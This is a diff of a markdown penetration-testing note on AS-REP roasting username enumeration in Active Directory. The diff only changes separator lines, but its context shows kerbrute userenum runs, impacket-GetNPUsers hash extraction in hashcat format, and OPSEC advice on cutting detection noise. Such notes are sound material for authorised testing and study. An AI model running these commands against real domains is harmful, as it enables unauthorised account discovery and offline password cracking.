@@ -16,7 +16,7 @@ linked:
 ---
 # AS-REP Roasting - Username Enumeration
 
-***
+---
 
 ## kerbrute userenum
 
@@ -42,7 +42,7 @@ kerbrute userenum --dc <DC> -d corp.local usernames.txt -o valid.txt
 # [+] [Bonus] AS-REP roastable: legacy_svc@corp.local
 ```
 
-___
+---
 
 ## Username List Sources
 
@@ -58,7 +58,7 @@ ___
 | `cewl https://corp.com -d 3 -m 5 -w cewl.txt` | Crawl public site | Pattern hints. |
 ^asrep-userenum-sources
 
-___
+---
 
 ## OSINT Pipeline
 
@@ -90,7 +90,7 @@ impacket-GetNPUsers corp.local/ -dc-ip <DC> \
   -format hashcat -outputfile asrep.hash
 ```
 
-___
+---
 
 ## Common Naming Patterns
 
@@ -126,7 +126,7 @@ done | sort -u > usernames.txt
 ./username-anarchy -i names.txt > usernames.txt
 ```
 
-___
+---
 
 ## Cross-Reference: Kerbrute Detects AS-REP Inline
 
@@ -140,7 +140,7 @@ kerbrute userenum --dc <DC> -d corp.local usernames.txt -o valid.txt 2>&1 |
   grep "AS-REP returned" | awk '{print $5}' | sed 's/@.*//' > asrep_only.txt
 ```
 
-___
+---
 
 ## OPSEC: Kerbrute vs Bulk Roast
 
@@ -155,7 +155,7 @@ ___
 
 **Recomendación:** **siempre kerbrute first**. Filter usernames → roast solo valid users. Reduce noise + faster.
 
-___
+---
 
 ## Common Errors
 
@@ -168,4 +168,4 @@ ___
 | `Connection refused` | Firewall block 88 | Port test + alt DC. |
 ^asrep-userenum-errors
 
-***
+---
